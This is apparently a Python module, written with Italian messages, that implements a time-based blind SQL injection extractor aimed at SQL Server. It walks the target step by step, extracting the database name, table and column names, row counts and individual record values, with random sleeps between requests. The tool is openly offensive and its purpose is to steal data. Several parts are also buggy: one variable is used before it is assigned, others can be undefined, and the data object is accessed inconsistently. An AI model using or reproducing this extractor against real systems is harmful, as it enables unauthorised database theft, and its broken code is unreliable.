from blind_sqli_extractor_base import BlindSQLIExtractorBase
import time
from data_classes import ExtractedDataTableNames, ExtractedDataColumnNames, ExtractedDataValues, ExtractedDataTarget

# TODO: ricontrollare gli sleep inseriti se forse non è meglio metterli laddove vengono invocate le request invece che dappertutto !
class BlindSqlITimeExtractor(BlindSQLIExtractorBase):

    def set_db_name(self, db_name: str):
        self.extracted_data.db_name = db_name.strip()
        print(f"Nome del database impostato su: {self.extracted_data.db_name}")

    def set_table_target(self, table_name: str):
        if table_name.strip() not in self.extracted_data.tables.table_names:
            print(
                f"Errore: la tabella '{table_name}' non è presente nella lista delle tabelle scoperte. Tabelle scoperte: {self.extracted_data.tables.table_names}"
            )
            return
        
        if self.extracted_data.target.table_name and self.extracted_data.target.table_name != table_name.strip():
            # TODO: aggiungere conferma sovrascrittura
            self.extracted_data.target = ExtractedDataTarget()
        
        if self.extracted_data.target.table_name: return

        self.extracted_data.target.table_name = table_name.strip()
        self.save_data()

    def extract_db_name(self):
        if self.extracted_data.db_name_length == 0:
            db_name_length = self.dump_length("LEN(db_name())")
            if not db_name_length:
                print(
                    "Errore: non è stato possibile determinare la lunghezza del nome del database. Verificare che la connessione al database sia corretta e che la funzione db_name() sia supportata."
                )
                return
            print(f"Il nome del DB è lungo {db_name_length} caratteri.")
            self.extracted_data.db_name_length = db_name_length
            self.save_data()
            self.random_time_sleep()

        if self.settings.optimizer == "anding":
            db_name = self.dump_string_anding("db_name()", db_name_length)
        elif self.settings.optimizer == "bisection":
            db_name = self.dump_string_bisection("db_name()", db_name_length)
        else:
            db_name = None

        print(f"Il nome del DB è: {db_name}")
        if db_name:
            self.extracted_data.db_name = db_name
            self.save_data()

        return self.extracted_data.db_name

    def extract_tables(self, num_tables_input=None):
        if not self._check_db_name_presence(): return
        
        if not num_tables_input and not self.extracted_data.tables.total_tables_num:
            num_tables = self.dump_length(
                f"SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{self.extracted_data.db_name}'"
            )
            if not num_tables:
                print(
                    f"Errore: non è stato possibile determinare il numero di tabelle presenti nel database '{self.extracted_data.db_name}'. Verificare che la connessione al database sia corretta e che la query per contare le tabelle sia supportata."
                )
                return
            print(f"Il numero di tabelle nel DB è: {num_tables}")
            self.extracted_data.tables.total_tables_num = num_tables
            self.random_time_sleep()
            
        elif num_tables_input:
            try:
                self.extracted_data.tables.total_tables_num = int(num_tables_input)
            except (TypeError, ValueError):
                print("Errore: il numero di tabelle deve essere un intero.")
                return
        self.save_data()
        

        for i in range(self.extracted_data.tables.total_tables_num):
            while len(self.extracted_data.tables.table_names) <= i:
                self.extracted_data.tables.table_names.append(ExtractedDataTableNames())

            if self.extracted_data.tables.table_names[i].table_length == 0:
                table_name_length = self.dump_length(
                    f"select LEN(table_name) from information_schema.tables where table_catalog='{self.extracted_data.db_name}' order by table_name offset {i} rows fetch next 1 rows only"
                )
                print(f"Tabella {str(i)} - lunghezza nome: {str(table_name_length)}")
                self.extracted_data.tables.table_names[i].table_length = table_name_length
                self.save_data()
                self.random_time_sleep()

            q = f"select table_name from information_schema.tables where table_catalog='{self.extracted_data.db_name}' order by table_name offset {i} rows fetch next 1 rows only"
            table_name = (
                self.dump_string_anding(q, self.extracted_data.tables.table_names[i].table_length)
                if self.settings.optimizer == "anding"
                else self.dump_string_bisection(q, self.extracted_data.tables.table_names[i].table_length)
            )
            print(f"Tabella {str(i)} - nome: {table_name}")
            if table_name:
                self.extracted_data.tables.table_names[i].table_name = table_name
                self.save_data()
                self.random_time_sleep()

        return self.extracted_data.tables.table_names

    def _extract_column_names(self):
        target = self.extracted_data.get("target", {})

        if target and target.get("total_columns_num", 0) == 0:
            num_columns = self.dump_length(
                f"SELECT COUNT(*) FROM information_schema.columns WHERE TABLE_CATALOG='{self.extracted_data.db_name}' AND TABLE_NAME='{self.extracted_data.target.table_name}'"
            )
            if not num_columns:
                print(
                    f"Errore: non è stato possibile determinare il numero di colonne presenti nella tabella '{self.extracted_data.target.table_name}'. Verificare che la connessione al database sia corretta e che la query per contare le colonne sia supportata."
                )
                return
            print(f"Il numero di colonne nella tabella {self.extracted_data.target.table_name} è: {num_columns}")
            self.extracted_data.target.total_columns_num = num_columns
            self.save_data()
            self.random_time_sleep()

        print("Sono presenti le seguenti colonne: ", end="\r\n")
        for i in range(num_columns):
            while len(self.extracted_data.target.column_names) <= i:
                self.extracted_data.target.column_names.append(ExtractedDataColumnNames())

            if self.extracted_data.target.column_names[i].column_length > 0 and len(self.extracted_data.target.column_names[i].column_name) == self.extracted_data.target.column_names[i].column_length:
                continue
            
            if self.extracted_data.target.column_names[i].column_length == 0:
                column_name_length = self.dump_length(
                    f"select LEN(column_name) from information_schema.columns where table_catalog='{self.extracted_data.db_name}' AND table_name='{self.extracted_data.target.table_name}' order by column_name offset {i} rows fetch next 1 rows only"
                )
                if not column_name_length:
                    print(f"Errore: non è stato possibile determinare la lunghezza della colonna n. {str(i)}.")
                    return
                self.extracted_data.target.column_names[i].column_length = column_name_length
                self.save_data()
                self.random_time_sleep()


            q = f"select column_name from information_schema.columns where table_catalog='{self.extracted_data.db_name}' AND table_name='{self.extracted_data.target.table_name}' order by column_name offset {i} rows fetch next 1 rows only"
            column_name = (self.dump_string_anding(q, column_name_length) if self.settings.optimizer == "anding" else self.dump_string_bisection(q, column_name_length))
            print(f"{str(i)} - {column_name}")
            if column_name:
                self.extracted_data.target.column_names[i].column_name = column_name
                self.save_data()
                self.random_time_sleep()

        return self.extracted_data.target.column_names

    def _extract_rows_length(self):
        num_rows = self.dump_length(f"SELECT COUNT(*) FROM {self.extracted_data.target.table_name}")
        if not num_rows:
            print(
                f"Errore: non è stato possibile determinare il numero di righe presenti nella tabella '{self.extracted_data.target.table_name}'. Verificare che la connessione al database sia corretta e che la query per contare le righe sia supportata."
            )
            return
        print(f"Nella tabella {self.extracted_data.target.table_name} ci sono {str(num_rows)} righe.")
        return num_rows

    def extract_table_info(self, table_name: str):
        if not self._check_db_name_presence(): return

        self.set_table_target(table_name)
        self._extract_column_names()
        self._extract_rows_length()

    def extract_record_content(self, column_name: str, row_number: int):
        if not self._check_db_name_presence(): return
        if not self.extracted_data.target.table_name:
            print("Errore: è necessario impostare prima la tabella target (funzione set_table_target())")
            return



        """ class ExtractedDataValues:
        column_name: Optional[str] = None
        row_number: Optional[int] = None
        value_length: int = 0
        value: Optional[str] = None """




        row_num_str = str(row_num_str)
        record_length = self.dump_length(
            f"SELECT LEN({column_name}) FROM {self.extracted_data.target.table_name} ORDER BY {column_name} OFFSET {row_number - 1} ROWS FETCH NEXT 1 ROWS ONLY"
        )
        if not record_length:
            print(
                f"Errore: non è stato possibile determinare la lunghezza del contenuto della riga {row_num_str} nella colonna {column_name}. Verificare che la tabella '{self.extracted_data.target.table_name}' e la colonna '{column_name}' esistano e che il numero di riga sia corretto."
            )
            return
        print(
            f"La lunghezza del contenuto della riga {row_num_str} nella colonna {column_name} è: {str(record_length)}"
        )

        q = f"SELECT {column_name} FROM {self.extracted_data.target.table_name} ORDER BY {column_name} OFFSET {row_number - 1} ROWS FETCH NEXT 1 ROWS ONLY"
        record_content = (
            self.dump_string_anding(q, record_length)
            if self.settings.optimizer == "anding"
            else self.dump_string_bisection(q, record_length)
        )
        print(f"Il contenuto della riga {row_number} nella colonna {column_name} è: ", end="\r\n")
        print(record_content)
        print("\r\n")

        return record_content

    def _check_db_name_presence(self):
        if not self.extracted_data.db_name:
            print("Errore: è necessario scoprire/inserire prima il nome del database (funzione discoverDBName())")
            return False
        return True
